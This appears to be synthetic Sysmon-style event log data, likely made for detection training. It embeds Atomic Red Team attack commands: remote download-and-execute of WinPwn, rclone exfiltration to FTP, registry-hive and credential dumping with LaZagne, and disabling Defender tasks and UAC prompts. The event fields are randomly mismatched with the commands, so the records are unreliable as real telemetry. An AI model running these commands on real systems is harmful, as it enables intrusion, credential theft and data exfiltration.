    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-62.schneider.com",
        "User": "rodneyhawkins",
        "ProcessID": 7324,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 430425,
        "LogonGuid": "915f6fb2-355b-4630-be0e-59643b4cd19e",
        "SourceProcessID": 8657,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\piece..exe",
        "DestinationProcessID": 8039,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\specific..exe",
        "UtcTime": "2024-05-17T01:36:51.803491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-65.gonzalez-davis.com",
        "User": "twilson",
        "ProcessID": 7048,
        "ProcessName": "nc.exe",
        "CommandLine": "\"gcloud config set project #{project-id}\\ngcloud iam roles create #{role-name} --description=\\\"#{role-description}\\\" --permissions=#{roles} --project=#{project-id}\\n\",",
        "LogonID": 276075,
        "LogonGuid": "5dec07b8-fbe9-4fd5-bac0-c2202714f255",
        "SourceProcessID": 4467,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\throw..dll",
        "DestinationProcessID": 2025,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\speak..exe",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-37.martinez.info",
        "User": "garrettjustin",
        "ProcessID": 3452,
        "ProcessName": "nc.exe",
        "CommandLine": "\"find / -path \\\"*/.config/chromium/*/Bookmarks\\\" -exec echo {} >> #{output_file} \\\\;\\ncat #{output_file} 2>/dev/null\\n\",",
        "LogonID": 466250,
        "LogonGuid": "af7469db-c405-4eb1-9b72-3207381b86f9",
        "SourceProcessID": 4319,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\put..dll",
        "DestinationProcessID": 6836,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\pattern..exe",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-26.morgan.com",
        "User": "donna12",
        "ProcessID": 8880,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"ipconfig /all\\nnetsh interface show interface\\narp -a\\nnbtstat -n\\nnet config\\n\",",
        "LogonID": 428025,
        "LogonGuid": "e3614cf1-54df-4e1a-9d5d-612969e990db",
        "SourceProcessID": 1020,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\whatever..exe",
        "DestinationProcessID": 5280,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\final..dll",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-66.harrington.com",
        "User": "dsandoval",
        "ProcessID": 2102,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sh -c \\\"echo 'echo Hello from the Atomic Red Team' > #{script_path}\\\"\\nsh -c \\\"echo 'ping -c 4 8.8.8.8' >> #{script_path}\\\"\\nchmod +x #{script_path}\\nsh #{script_path}\\n\",",
        "LogonID": 800636,
        "LogonGuid": "884aa453-cadb-4c60-bf63-e4216be55d19",
        "SourceProcessID": 2856,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\benefit..exe",
        "DestinationProcessID": 6061,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\cultural..dll",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-50.davis.biz",
        "User": "morrisjennifer",
        "ProcessID": 4546,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"ps >> #{output_file}\\nps aux >> #{output_file}\\n\",",
        "LogonID": 887562,
        "LogonGuid": "30aa6bdb-63ca-4d2e-b955-8501870ecf77",
        "SourceProcessID": 3232,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\long..exe",
        "DestinationProcessID": 1890,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\better..exe",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-64.carter.com",
        "User": "martincynthia",
        "ProcessID": 2037,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"shutdown /r /t #{timeout}\\n\",",
        "LogonID": 611039,
        "LogonGuid": "eb1bc7a3-5a53-4696-85e3-21bc00fb79a0",
        "SourceProcessID": 3816,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\ability..exe",
        "DestinationProcessID": 6902,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\rock..exe",
        "UtcTime": "2024-05-17T01:36:51.804490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-40.barnes.com",
        "User": "janetpalmer",
        "ProcessID": 9023,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\\n\",",
        "LogonID": 608665,
        "LogonGuid": "15612641-21a7-42ce-8b16-8267c8dbb838",
        "SourceProcessID": 1430,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\power..exe",
        "DestinationProcessID": 4596,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\sure..dll",
        "UtcTime": "2024-05-17T01:36:51.805490Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-50.cox-munoz.net",
        "User": "matthew62",
        "ProcessID": 4964,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"wmic group get name\\n\",",
        "LogonID": 750639,
        "LogonGuid": "241190d7-e68b-4624-9536-a3692a55db3f",
        "SourceProcessID": 6926,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\someone..exe",
        "DestinationProcessID": 8197,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\lot..dll",
        "UtcTime": "2024-05-17T01:36:51.805490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-89.norman.com",
        "User": "kimberly06",
        "ProcessID": 1635,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"\\\"#{uacme_exe}\\\"\\n\",",
        "LogonID": 578181,
        "LogonGuid": "cbea1885-de60-43c8-b7c8-13bafc599dde",
        "SourceProcessID": 3809,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\region..dll",
        "DestinationProcessID": 4541,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\teach..exe",
        "UtcTime": "2024-05-17T01:36:51.805490Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-46.strickland-jones.info",
        "User": "kvillarreal",
        "ProcessID": 6212,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$notepad = Start-Process notepad -passthru\\nStart-Process \\\"$PathToAtomicsFolder\\\\T1055.003\\\\bin\\\\InjectContext.exe\\\"\\nStart-Sleep -Seconds 5\\nStop-Process $notepad.id\",",
        "LogonID": 823126,
        "LogonGuid": "aca3d9b0-960d-4639-a66f-9aa349d1c105",
        "SourceProcessID": 3796,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\smile..dll",
        "DestinationProcessID": 5738,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\their..dll",
        "UtcTime": "2024-05-17T01:36:51.805490Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-15.hawkins-grimes.com",
        "User": "fzavala",
        "ProcessID": 2148,
        "ProcessName": "nc.exe",
        "CommandLine": "\"gcloud config set project #{project_id}\\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\\\"value(KEY_ID)\\\" --limit=1`\\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\\n\",",
        "LogonID": 687488,
        "LogonGuid": "d59ef48f-578a-4efc-9557-2a7b943c5202",
        "SourceProcessID": 3153,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\most..exe",
        "DestinationProcessID": 8464,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\candidate..dll",
        "UtcTime": "2024-05-17T01:36:51.805490Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-88.stuart.biz",
        "User": "alewis",
        "ProcessID": 6228,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"driverquery /v\\ndriverquery /si\\n\",",
        "LogonID": 296691,
        "LogonGuid": "4bbe1ecc-395f-4c84-be85-cfc4dfd965ac",
        "SourceProcessID": 1764,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\partner..dll",
        "DestinationProcessID": 5362,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\impact..exe",
        "UtcTime": "2024-05-17T01:36:51.806490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-23.harris.net",
        "User": "travis97",
        "ProcessID": 6176,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"\\\"#{vboxmanage_exe}\\\" createvm --name \\\"#{vm_name}\\\" --register\\n\\\"#{vboxmanage_exe}\\\" modifyvm \\\"#{vm_name}\\\" --firmware efi\\n\\\"#{vboxmanage_exe}\\\" startvm \\\"#{vm_name}\\\"\\n\",",
        "LogonID": 532530,
        "LogonGuid": "3cec0193-4097-46dd-9fb4-08427dc74aff",
        "SourceProcessID": 7710,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\feeling..dll",
        "DestinationProcessID": 4552,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\challenge..exe",
        "UtcTime": "2024-05-17T01:36:51.806490Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-65.booker-walton.com",
        "User": "anthonygregory",
        "ProcessID": 9353,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"conhost.exe \\\"#{process}\\\"\\n\",",
        "LogonID": 954968,
        "LogonGuid": "2aedec63-f35d-43b2-94e0-865aa87f4fa5",
        "SourceProcessID": 9899,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\least..exe",
        "DestinationProcessID": 5611,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\time..dll",
        "UtcTime": "2024-05-17T01:36:51.806490Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-91.lambert.info",
        "User": "melody40",
        "ProcessID": 9642,
        "ProcessName": "nc.exe",
        "CommandLine": "\"python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}\",",
        "LogonID": 322355,
        "LogonGuid": "9a6c2d3a-a57d-4522-a9a9-61f869edc0f4",
        "SourceProcessID": 7318,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\position..dll",
        "DestinationProcessID": 4398,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\cell..exe",
        "UtcTime": "2024-05-17T01:36:51.806490Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-59.strickland-moore.com",
        "User": "sotopaige",
        "ProcessID": 6005,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"IF EXIST \\\"%temp%\\\\Windows_Defender_Scheduled_Scan.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Cleanup.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Verification.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Cache_Maintenance.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\\" /f )\\n\",",
        "LogonID": 491484,
        "LogonGuid": "ea1c40eb-187e-4097-a2cb-b65644acf970",
        "SourceProcessID": 3161,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\laugh..exe",
        "DestinationProcessID": 3271,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\suffer..dll",
        "UtcTime": "2024-05-17T01:36:51.806490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-89.johnson.com",
        "User": "rodney03",
        "ProcessID": 9014,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:\\\"$env:localappdata\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\\\" \\\"PathToAtomicsFolder\\\\T1574.008\\\\bin\\\\calc.cs\\\"\\nPowershell -noprofile\\n\",",
        "LogonID": 370791,
        "LogonGuid": "45d7bdd4-a863-42a6-aa58-372cd6b3b83c",
        "SourceProcessID": 5394,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\loss..exe",
        "DestinationProcessID": 7165,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\plant..exe",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-61.thomas.com",
        "User": "jason10",
        "ProcessID": 1426,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$orgValue =(Get-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\\nSet-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force\",",
        "LogonID": 356741,
        "LogonGuid": "4176e1d4-d0e0-4ff0-967d-4b9e7d16a664",
        "SourceProcessID": 9923,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\state..exe",
        "DestinationProcessID": 5996,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\work..dll",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-90.rivera.com",
        "User": "rachel39",
        "ProcessID": 5108,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 610523,
        "LogonGuid": "f110b16c-858f-40bc-ba7b-9365a5486d0e",
        "SourceProcessID": 1295,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\word..dll",
        "DestinationProcessID": 2730,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\amount..dll",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-16.duncan-daniels.org",
        "User": "donaldmorgan",
        "ProcessID": 4304,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$address = (& \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\searchVuln.exe\\\" \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\vuln_dll\\\\\\\" | Out-String | Select-String -Pattern \\\"VirtualAddress: (\\\\w+)\\\").Matches.Groups[1].Value\\n& \\\"PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\RWXinjectionLocal.exe\\\" \\\"#{vuln_dll}\\\" $address\\n\",",
        "LogonID": 472283,
        "LogonGuid": "77a5cf4c-94a0-42fa-b839-11cb15989cc6",
        "SourceProcessID": 6125,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\site..dll",
        "DestinationProcessID": 4657,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\after..exe",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-26.gardner.com",
        "User": "ashley96",
        "ProcessID": 8419,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Stop-Service -Name \\\"#{service_name}\\\" -force -erroraction silentlycontinue | Out-Null\\nset-servicebinarypath -name \\\"#{service_name}\\\" -path \\\"#{new_bin_path}\\\"\\nstart-service -Name \\\"#{service_name}\\\" -erroraction silentlycontinue | out-null\",",
        "LogonID": 281298,
        "LogonGuid": "f26c48ee-4cd8-4578-8d36-0121148b095a",
        "SourceProcessID": 4593,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\method..exe",
        "DestinationProcessID": 6442,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\over..dll",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-69.alvarez.info",
        "User": "claudia72",
        "ProcessID": 7838,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"1..#{limit} | % { \\n try { [System.IO.File]::Copy(\\\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy$_\\\\Windows\\\\System32\\\\config\\\\#{target_hive}\\\" , \\\"$env:TEMP\\\\#{target_hive}vss$_\\\", \\\"true\\\") } catch {}\\n ls \\\"$env:TEMP\\\\#{target_hive}vss$_\\\" -ErrorAction Ignore\\n}\\n\",",
        "LogonID": 735464,
        "LogonGuid": "fbf29fb4-c636-4d7e-b509-91273833ea03",
        "SourceProcessID": 8813,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\open..dll",
        "DestinationProcessID": 4146,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\like..dll",
        "UtcTime": "2024-05-17T01:36:51.807491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-67.norris.com",
        "User": "hansenrenee",
        "ProcessID": 2472,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:#{file_url}\\\").Exec();window.close();\\n\",",
        "LogonID": 406065,
        "LogonGuid": "6d43bd6a-b092-4c35-a84b-9e465b772e32",
        "SourceProcessID": 1149,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\group..dll",
        "DestinationProcessID": 4852,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\player..exe",
        "UtcTime": "2024-05-17T01:36:51.808490Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-94.fuller.com",
        "User": "ashley49",
        "ProcessID": 5616,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"mkdir -p /tmp/atomic-test-T1036.006\\ncd /tmp/atomic-test-T1036.006\\nmkdir -p 'testdirwithspaceend '\\n[ \\\"$(uname)\\\" = 'FreeBSD' ] && /bin/echo \\\"#\\\\!/bin/sh\\\" > \\\"testdirwithspaceend /init \\\" && echo 'echo \\\"print(\\\\\\\"running T1035.006 with space after filename to masquerade init\\\\\\\")\\\" | python3.9' >> \\\"testdirwithspaceend /init \\\" && echo \\\"exit\\\" >> \\\"testdirwithspaceend /init \\\" || /usr/bin/echo -e \\\"%d\\\\na\\\\n#!/usr/bin/perl\\\\nprint \\\\\\\"running T1035.006 with space after filename to masquerade init\\\\\\\\n\\\\\\\";\\\\nqx/cp \\\\/usr\\\\/bin\\\\/perl 'init  '/;\\\\nqx/'.\\\\/init  ' -e 'sleep 5'/;\\\\n.\\\\nwq\\\\n\\\" | ed 'testdirwithspaceend /init ' >/dev/null\\nchmod +x 'testdirwithspaceend /init '\\n'./testdirwithspaceend /init '\\n\",",
        "LogonID": 297903,
        "LogonGuid": "be1dc778-0958-4868-80d9-6ad66c480984",
        "SourceProcessID": 5735,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\technology..dll",
        "DestinationProcessID": 7579,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\road..dll",
        "UtcTime": "2024-05-17T01:36:51.808490Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-99.byrd.com",
        "User": "aliciakennedy",
        "ProcessID": 9745,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cat /etc/pam.d/common-password\\n\",",
        "LogonID": 992665,
        "LogonGuid": "cc462bb7-dda0-46d0-93cc-6fd1e5b21d04",
        "SourceProcessID": 9616,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\customer..dll",
        "DestinationProcessID": 7827,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\probably..exe",
        "UtcTime": "2024-05-17T01:36:51.808490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-79.marshall.org",
        "User": "sarah21",
        "ProcessID": 5196,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nspoolvulnscan -noninteractive -consoleoutput\",",
        "LogonID": 884478,
        "LogonGuid": "2dc6e5a5-e4cf-4c46-8ee0-c7734bfd1569",
        "SourceProcessID": 8745,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\school..exe",
        "DestinationProcessID": 9727,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\military..dll",
        "UtcTime": "2024-05-17T01:36:51.808490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-76.ponce.net",
        "User": "devinfitzpatrick",
        "ProcessID": 5374,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo echo '' > #{system_log_path}\\n\",",
        "LogonID": 807534,
        "LogonGuid": "004e5a1e-24d1-4b16-a11b-d42f2daf68bc",
        "SourceProcessID": 8477,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\several..exe",
        "DestinationProcessID": 8450,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\about..dll",
        "UtcTime": "2024-05-17T01:36:51.808490Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-28.reese-powell.info",
        "User": "kennethandrews",
        "ProcessID": 3982,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo cp #{script_location} #{script_destination}\\nsudo touch /private/var/db/emondClients/#{empty_file}\\n\",",
        "LogonID": 502207,
        "LogonGuid": "45202516-06c8-4166-ae28-54c407203b03",
        "SourceProcessID": 7206,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\strategy..dll",
        "DestinationProcessID": 4381,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\continue..dll",
        "UtcTime": "2024-05-17T01:36:51.809491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-26.martin-hernandez.net",
        "User": "emartinez",
        "ProcessID": 8415,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reboot\\n\",",
        "LogonID": 387674,
        "LogonGuid": "d510dd34-550a-499f-bed7-df661916a9ab",
        "SourceProcessID": 9597,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\red..exe",
        "DestinationProcessID": 7276,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\law..dll",
        "UtcTime": "2024-05-17T01:36:51.809491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-27.gomez.com",
        "User": "maryknight",
        "ProcessID": 7402,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cp #{payload} /tmp/cap.c\\nmake /tmp/cap\\nsudo setcap cap_setuid=ep /tmp/cap\\n/tmp/cap\\n\",",
        "LogonID": 743131,
        "LogonGuid": "151072c3-73dd-4957-94ba-c53046978adc",
        "SourceProcessID": 1905,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\magazine..exe",
        "DestinationProcessID": 9294,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\deep..exe",
        "UtcTime": "2024-05-17T01:36:51.809491Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-19.best.info",
        "User": "tylerchelsea",
        "ProcessID": 6005,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"wmic process get caption,executablepath,commandline /format:csv\\n\",",
        "LogonID": 182058,
        "LogonGuid": "52d2ddcf-7ff1-40c4-84d4-68d0da911f61",
        "SourceProcessID": 6425,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\mean..dll",
        "DestinationProcessID": 2970,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\structure..exe",
        "UtcTime": "2024-05-17T01:36:51.809491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-14.may-dunn.com",
        "User": "calvindavis",
        "ProcessID": 6471,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\\n\",",
        "LogonID": 436697,
        "LogonGuid": "a8cc9c5d-500f-469c-9c80-81f0eb8b56be",
        "SourceProcessID": 3012,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\must..exe",
        "DestinationProcessID": 1078,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\word..dll",
        "UtcTime": "2024-05-17T01:36:51.809491Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-82.wallace-shaw.net",
        "User": "pamela77",
        "ProcessID": 8363,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$rclone_bin = Get-ChildItem C:\\\\Users\\\\Public\\\\Downloads\\\\ -Recurse -Include \\\"rclone.exe\\\" | Select-Object -ExpandProperty FullName\\n$exfil_pack = Get-ChildItem C:\\\\Users\\\\Public\\\\Downloads\\\\ -Recurse -Include \\\"exfil.zip\\\" | Select-Object -ExpandProperty FullName\\n&$rclone_bin config create ftpserver \\\"ftp\\\" \\\"host\\\" #{ftp_server} \\\"port\\\" #{ftp_port} \\\"user\\\" #{ftp_user} \\\"pass\\\" #{ftp_pass}\\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate\",",
        "LogonID": 972374,
        "LogonGuid": "526b4551-513f-4810-a334-aed0080c1972",
        "SourceProcessID": 6417,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\other..exe",
        "DestinationProcessID": 6775,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\term..dll",
        "UtcTime": "2024-05-17T01:36:51.810491Z"
    },
    {
